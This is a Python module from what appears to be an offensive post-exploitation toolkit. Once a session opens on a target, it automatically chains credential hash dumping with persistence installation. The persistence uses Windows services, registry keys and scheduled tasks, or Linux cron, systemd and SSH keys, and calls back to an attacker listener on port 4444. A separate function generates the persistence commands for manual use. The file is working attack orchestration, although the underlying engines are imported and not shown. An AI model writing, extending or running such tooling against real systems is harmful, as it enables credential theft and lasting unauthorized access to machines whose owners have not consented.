"""
Session Hook Integration Module
Integrates persistence with CrackSession workflow
"""

from cybermodules.persistence import PersistenceEngine, PersistenceMethod, OSType
from cybermodules.hashdump import HashDumpEngine


class SessionHookManager:
    """
    Manages automatic execution after session acquisition
    Chains: Session Open -> Hashdump -> Persistence -> Intel Report
    """
    
    def __init__(self, scan_id):
        self.scan_id = scan_id
        self.engines = {}
    
    def on_session_opened(self, session_info):
        """
        Called when a new session is established
        Automatically runs: hashdump + persistence + reporting
        """
        results = {
            "session": session_info,
            "hashdump": None,
            "persistence": None,
            "errors": []
        }
        
        target = session_info.get("target")
        username = session_info.get("username")
        password = session_info.get("password")
        domain = session_info.get("domain", "")
        lhost = session_info.get("lhost", "")
        lport = session_info.get("lport", 4444)
        
        # Step 1: Run hashdump (if credentials provided)
        if username and password:
            try:
                hash_engine = HashDumpEngine(self.scan_id, session_info)
                hash_result = hash_engine.execute_session_hook()
                results["hashdump"] = {
                    "success": hash_result.get("success", False),
                    "cracked_count": hash_result.get("total_cracked", 0),
                    "hash_count": len(hash_result.get("extraction", {}).get("hashes", []))
                }
            except Exception as e:
                results["errors"].append(f"Hashdump error: {str(e)}")
        
        # Step 2: Install persistence
        try:
            persist_engine = PersistenceEngine(self.scan_id, session_info)
            persist_engine.set_connection_info(lhost, lport)
            
            # Auto-install based on OS
            os_type = session_info.get("os", "").lower()
            if "windows" in os_type:
                methods = ["service", "registry", "scheduled_task"]
            else:
                methods = ["cron", "systemd", "ssh_key"]
            
            persist_results = persist_engine.install_all(methods)
            results["persistence"] = {
                "success": len(persist_results) > 0,
                "methods": [p.get("method") for p in persist_results],
                "commands": persist_engine.get_commands(),
                "report": persist_engine.generate_report()
            }
        except Exception as e:
            results["errors"].append(f"Persistence error: {str(e)}")
        
        return results
    
    def get_persistence_commands(self, session_info):
        """
        Get persistence commands for manual execution
        """
        persist_engine = PersistenceEngine(self.scan_id, session_info)
        persist_engine.set_connection_info(
            session_info.get("lhost", ""),
            session_info.get("lport", 4444)
        )
        
        # Generate but don't execute
        os_type = session_info.get("os", "").lower()
        if "windows" in os_type:
            persist_engine.os_type = OSType.WINDOWS
            persist_engine.install_windows_service()
            persist_engine.install_registry_persistence()
            persist_engine.install_scheduled_task()
        else:
            persist_engine.os_type = OSType.LINUX
            persist_engine.install_cron_persistence()
            persist_engine.install_systemd_persistence()
            persist_engine.install_ssh_key_persistence()
        
        return persist_engine.get_commands()


def execute_session_chain(scan_id, session_info):
    """
    Execute complete session chain: hashdump + persistence
    """
    manager = SessionHookManager(scan_id)
    return manager.on_session_opened(session_info)